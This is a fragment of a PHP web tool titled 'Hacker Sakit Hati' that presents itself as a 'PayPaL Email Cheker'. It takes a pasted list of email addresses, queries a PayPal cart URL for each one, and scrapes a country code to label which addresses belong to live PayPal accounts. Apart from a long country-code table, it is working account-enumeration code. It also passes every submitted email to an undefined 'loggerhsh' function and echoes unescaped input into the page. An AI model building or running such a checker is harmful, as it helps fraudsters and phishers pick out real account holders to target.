        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_FAILONERROR, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_COOKIESESSION, true);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
//      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//          "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
//          "Accept: application/json, text/javascript, */*; q=0.01",
//          "X-Requested-With: XMLHttpRequest"
//      ));
        $resultz = curl_exec($ch);
        $error = curl_error($ch);
        $poop = preg_match_all("/s.eVar36=\"(.*?)\";/",$resultz,$roti);
//      $result = current(preg_grep("/ip-address=(.*)/",explode("<div ",$resultz)));
//      $result = explode("=",$result);
//      $result = array(cut("\"","\" ",$result[1]), cut("\"","\">",$result[5]));
 
        curl_close($ch);
        if($roti[1][0] != ""){
                return $roti[1][0];
        }else{
                return "Invalid Country Code";
        }
}
 
$co = array(
"AF"=>"Afghanistan",
"AX"=>"\xc3\x85land Islands",
"AL"=>"Albania",
"DZ"=>"Algeria",
"AS"=>"American Samoa",
"AD"=>"Andorra",
"AO"=>"Angola",
"AI"=>"Anguilla",
"AQ"=>"Antarctica",
"AG"=>"Antigua and Barbuda",
"AR"=>"Argentina",
"AM"=>"Armenia",
"AW"=>"Aruba",
"AU"=>"Australia",
"AT"=>"Austria",
"AZ"=>"Azerbaijan",
"BS"=>"Bahamas",
"BH"=>"Bahrain",
"BD"=>"Bangladesh",
"BB"=>"Barbados",
"BY"=>"Belarus",
"BE"=>"Belgium",
"BZ"=>"Belize",
"BJ"=>"Benin",
"BM"=>"Bermuda",
"BT"=>"Bhutan",
"BO"=>"Bolivia, Plurinational State of",
"BQ"=>"Bonaire, Sint Eustatius and Saba",
"BA"=>"Bosnia and Herzegovina",
"BW"=>"Botswana",
"BV"=>"Bouvet Island",
"BR"=>"Brazil",
"IO"=>"British Indian Ocean Territory",
"BN"=>"Brunei Darussalam",
"BG"=>"Bulgaria",
"BF"=>"Burkina Faso",
"BI"=>"Burundi",
"KH"=>"Cambodia",
"CM"=>"Cameroon",
"CA"=>"Canada",
"CV"=>"Cape Verde",
"KY"=>"Cayman Islands",
"CF"=>"Central African Republic",
"TD"=>"Chad",
"CL"=>"Chile",
"CN"=>"China",
"CX"=>"Christmas Island",
"CC"=>"Cocos (Keeling) Islands",
"CO"=>"Colombia",
"KM"=>"Comoros",
"CG"=>"Congo",
"CD"=>"Congo, The Democratic Republic of the",
"CK"=>"Cook Islands",
"CR"=>"Costa Rica",
"CI"=>"C\xc3\xb4te d'Ivoire",
"HR"=>"Croatia",
"CU"=>"Cuba",
"CW"=>"Cura\xc3\xa7ao",
"CY"=>"Cyprus",
"CZ"=>"Czech Republic",
"DK"=>"Denmark",
"DJ"=>"Djibouti",
"DM"=>"Dominica",
"DO"=>"Dominican Republic",
"EC"=>"Ecuador",
"EG"=>"Egypt",
"SV"=>"El Salvador",
"GQ"=>"Equatorial Guinea",
"ER"=>"Eritrea",
"EE"=>"Estonia",
"ET"=>"Ethiopia",
"FK"=>"Falkland Islands (Malvinas)",
"FO"=>"Faroe Islands",
"FJ"=>"Fiji",
"FI"=>"Finland",
"FR"=>"France",
"GF"=>"French Guiana",
"PF"=>"French Polynesia",
"TF"=>"French Southern Territories",
"GA"=>"Gabon",
"GM"=>"Gambia",
"GE"=>"Georgia",
"DE"=>"Germany",
"GH"=>"Ghana",
"GI"=>"Gibraltar",
"GR"=>"Greece",
"GL"=>"Greenland",
"GD"=>"Grenada",
"GP"=>"Guadeloupe",
"GU"=>"Guam",
"GT"=>"Guatemala",
"GG"=>"Guernsey",
"GN"=>"Guinea",
"GW"=>"Guinea-Bissau",
"GY"=>"Guyana",
"HT"=>"Haiti",
"HM"=>"Heard Island and McDonald Islands",
"VA"=>"Holy See (Vatican City State)",
"HN"=>"Honduras",
"HK"=>"Hong Kong",
"HU"=>"Hungary",
"IS"=>"Iceland",
"IN"=>"India",
"ID"=>"Indonesia",
"IR"=>"Iran, Islamic Republic of",
"IQ"=>"Iraq",
"IE"=>"Ireland",
"IM"=>"Isle of Man",
"IL"=>"Israel",
"IT"=>"Italy",
"JM"=>"Jamaica",
"JP"=>"Japan",
"JE"=>"Jersey",
"JO"=>"Jordan",
"KZ"=>"Kazakhstan",
"KE"=>"Kenya",
"KI"=>"Kiribati",
"KP"=>"Korea, Democratic People's Republic of",
"KR"=>"Korea, Republic of",
"KW"=>"Kuwait",
"KG"=>"Kyrgyzstan",
"LA"=>"Lao People's Democratic Republic",
"LV"=>"Latvia",
"LB"=>"Lebanon",
"LS"=>"Lesotho",
"LR"=>"Liberia",
"LY"=>"Libya",
"LI"=>"Liechtenstein",
"LT"=>"Lithuania",
"LU"=>"Luxembourg",
"MO"=>"Macao",
"MK"=>"Macedonia, The Former Yugoslav Republic of",
"MG"=>"Madagascar",
"MW"=>"Malawi",
"MY"=>"Malaysia",
"MV"=>"Maldives",
"ML"=>"Mali",
"MT"=>"Malta",
"MH"=>"Marshall Islands",
"MQ"=>"Martinique",
"MR"=>"Mauritania",
"MU"=>"Mauritius",
"YT"=>"Mayotte",
"MX"=>"Mexico",
"FM"=>"Micronesia, Federated States of",
"MD"=>"Moldova, Republic of",
"MC"=>"Monaco",
"MN"=>"Mongolia",
"ME"=>"Montenegro",
"MS"=>"Montserrat",
"MA"=>"Morocco",
"MZ"=>"Mozambique",
"MM"=>"Myanmar",
"NA"=>"Namibia",
"NR"=>"Nauru",
"NP"=>"Nepal",
"NL"=>"Netherlands",
"NC"=>"New Caledonia",
"NZ"=>"New Zealand",
"NI"=>"Nicaragua",
"NE"=>"Niger",
"NG"=>"Nigeria",
"NU"=>"Niue",
"NF"=>"Norfolk Island",
"MP"=>"Northern Mariana Islands",
"NO"=>"Norway",
"OM"=>"Oman",
"PK"=>"Pakistan",
"PW"=>"Palau",
"PS"=>"Palestine, State of",
"PA"=>"Panama",
"PG"=>"Papua New Guinea",
"PY"=>"Paraguay",
"PE"=>"Peru",
"PH"=>"Philippines",
"PN"=>"Pitcairn",
"PL"=>"Poland",
"PT"=>"Portugal",
"PR"=>"Puerto Rico",
"QA"=>"Qatar",
"RE"=>"R\xc3\xa9union",
"RO"=>"Romania",
"RU"=>"Russian Federation",
"RW"=>"Rwanda",
"BL"=>"Saint Barth\xc3\xa9lemy",
"SH"=>"Saint Helena, Ascension and Tristan Da Cunha",
"KN"=>"Saint Kitts and Nevis",
"LC"=>"Saint Lucia",
"MF"=>"Saint Martin (French part)",
"PM"=>"Saint Pierre and Miquelon",
"VC"=>"Saint Vincent and the Grenadines",
"WS"=>"Samoa",
"SM"=>"San Marino",
"ST"=>"Sao Tome and Principe",
"SA"=>"Saudi Arabia",
"SN"=>"Senegal",
"RS"=>"Serbia",
"SC"=>"Seychelles",
"SL"=>"Sierra Leone",
"SG"=>"Singapore",
"SX"=>"Sint Maarten (Dutch part)",
"SK"=>"Slovakia",
"SI"=>"Slovenia",
"SB"=>"Solomon Islands",
"SO"=>"Somalia",
"ZA"=>"South Africa",
"GS"=>"South Georgia and the South Sandwich Islands",
"SS"=>"South Sudan",
"ES"=>"Spain",
"LK"=>"Sri Lanka",
"SD"=>"Sudan",
"SR"=>"Suriname",
"SJ"=>"Svalbard and Jan Mayen",
"SZ"=>"Swaziland",
"SE"=>"Sweden",
"CH"=>"Switzerland",
"SY"=>"Syrian Arab Republic",
"TW"=>"Taiwan, Province of China",
"TJ"=>"Tajikistan",
"TZ"=>"Tanzania, United Republic of",
"TH"=>"Thailand",
"TL"=>"Timor-Leste",
"TG"=>"Togo",
"TK"=>"Tokelau",
"TO"=>"Tonga",
"TT"=>"Trinidad and Tobago",
"TN"=>"Tunisia",
"TR"=>"Turkey",
"TM"=>"Turkmenistan",
"TC"=>"Turks and Caicos Islands",
"TV"=>"Tuvalu",
"UG"=>"Uganda",
"UA"=>"Ukraine",
"AE"=>"United Arab Emirates",
"GB"=>"United Kingdom",
"US"=>"United States",
"UM"=>"United States Minor Outlying Islands",
"UY"=>"Uruguay",
"UZ"=>"Uzbekistan",
"VU"=>"Vanuatu",
"VE"=>"Venezuela, Bolivarian Republic of",
"VN"=>"Viet Nam",
"VG"=>"Virgin Islands, British",
"VI"=>"Virgin Islands, U.S.",
"WF"=>"Wallis and Futuna",
"EH"=>"Western Sahara",
"YE"=>"Yemen",
"ZM"=>"Zambia",
"ZW"=>"Zimbabwe"
);


###################################################################################################
echo '<title>Hacker Sakit Hati</title>
<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
 
	<style>*{ font-family:tahoma; font-size:12; }

input, textarea,select {

    border: 1px solid #626262;

}

</style>
<style type="text/css" media="screen">
body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
body {
	background:#;
	}

body,td,th,ul,p {
	font: normal normal normal 8pt/1em # ;
	color: #violet;
	}

textarea,input,select {
	font: normal normal normal 8pt/1em # ;
	color: #;
	background:#;
	}

a:link, a:visited {
	text-decoration: none;
	color: #;
	}

a:active, a:hover {
	text-decoration: underline;
	color: #;
	}

fieldset {
	padding-left: 10px; 
	padding-bottom: 10px; 
	border:1px solid #;
	}

legend {
	font: normal normal bold 9pt Arial;
	color: #;
	}

.bordercolor {
	background:#;
	}

.maincolor {
	background:#; 
	border:1px solid #;
	}

.button {
	background:#;
	}

.titlebarcolor {
	background:#;
	}

.titlefont {
	font: normal normal bold 9pt/1em Arial;
	color: #;
	text-decoration:none;
	}

.copyrightfont, .copyrightfont a {
	font: normal normal bold 9pt/1em Arial;
	color: #;
	text-decoration:none;
	}

</style>
<style type="text/css"><!-- a:link{color:#ffffff;text-decoration:none}--></style> 

<body>
<form action="" method="POST">
<div class="content" style="display:none;">
<div style="border: 1px blue ridge;-moz-box-shadow: inset 0px 0px 8px 1px aqua;-webkit-box-shadow: inset 0px 0px 8px 1px aqua;width: 400px;opacity: 0.85;
background-color: rgba(75, 75, 225, 0.1);">
<div style="color:#lime;margin-top: 3px;"></div><hr style="margin-top: 1px;margin-bottom: 2px;">

		</div>
		</div>
        </dt>
        </center>
                </header>
</div>
   <header>
      <div>
<center><textarea id="pop" name="emails" cols="10" rows="30" style="width: 30%; height: 40%;color:lime;border:2px;background-image:url(https://4.bp.blogspot.com/-rX-ss0rouIo/WDpjq1byhlI/AAAAAAAAAXI/RnfOGW_woCw2q8JpImmBXd9_EluDDDK6ACLcB/s1600/xs.png);background-repeat:repeat;background-position:top;"></textarea><br><div style="background-image:url(https://buatisengiseng.files.wordpress.com/2012/01/garis.gif);width:30%;height:2%;color:white;"><marquee direction="right" scrollamount="100" align="center" behavior="alternate"> > > > > | PayPaL Email Cheker | < < < < </marquee></div><br>
<button id=start value="WOOT" name="submit" type="submit">Play</button><button id=stop name="stop" type="submit" value="WOOT">Stop</button><br><button type="submit" name="delete" >Clear Cookie</button><img id="hack-run" src="https://4.bp.blogspot.com/-rX-ss0rouIo/WDpjq1byhlI/AAAAAAAAAXI/RnfOGW_woCw2q8JpImmBXd9_EluDDDK6ACLcB/s1600/xs.png" width="0" height="0">

			
			

                        </center>

</body>';

if(isset($_POST['delete'])){
unlink("cokie"); }
if(isset($_POST['submit'])){

$emails = $_POST['emails'];

loggerhsh($emails);


if (!empty($emails)) {
$emails = explode("\n", $emails);
$yes = 0;
$not = 0;
$inv = 0;
$count = 1;

print ' <center>
<table style="width: 800px;">
        <tr>
      <td style="width: 800px;">
<fieldset class="fieldset">
        <font color="white">Email PP Live: <br><br /><span id="ok" style="overflow-y:auto; width:500px; font-size: 11px;"></span></font></legend> ';
foreach ( $emails as $email ) {

    $email = trim($email); 
  
		$count++;
		if(filter_var($email, FILTER_VALIDATE_EMAIL)){
			
			$coc = ambil("cokie",rand_ua(),"https://www.paypal.com/cgi-bin/webscr?cmd=_cart&add=1&business=".$email.'') or Die('<b><font color="#FF0000">Server Error - Can\'t Check </font></b>');
			$cocok = isset($co[$coc]) ? "[" . $coc . "] " . $co[$coc] : "[" . $coc . "] Unknown";
		if ($coc == "Invalid Country Code"){
			//print "<font color=\"#821B1B\"> No</font><br>";
			$not++;
			$vaild_no .=$email."\n";
			echo "<script>'$email'</script>";
			}
		else {
		    //print "<font color=\"#2B702B\"> Yes</font> <br>";
			//<textarea  rows="10" name="S1" cols="43" class="auto-style5">'.$vaild_yes.'</textarea>
			echo "<img src=\"https://4.bp.blogspot.com/-LEou_cKkrp4/V0ox4mNRswI/AAAAAAAAASM/3wXWs90cmkUzmeox-8lWqBdZbiiDbhLdACLcB/s1600/lvs.gif\" height=\"15\"  width=\"30\" /> =><font color=lime > ".$cocok." | <font color=indigo >".$email." | <font color=white >Checked on  " . date("g:i a - F j, Y")."  <img src=\"https://3.bp.blogspot.com/-BEqhLf48jao/V0oof4ybSBI/AAAAAAAAARk/RmyvnXO_MY0Ct9biEtnwoljpYMy8T0R8ACLcB/s1600/dollar.gif\" height=\"15\"  width=\"15\" />   <br>";


			$yes++;
			$vaild_yes .=$email."\n";
			echo "<script>'$email'</script>";

		}
	}

}
print '

		

<center>
</table>
<table>
<tr>

<td>Total Email PP Live: '.$yes.' </td>
<td>Total Email PP Busuk : '.$not.'</td>
</tr>
</table>
<p>&nbsp;</p>


';


}
}?>
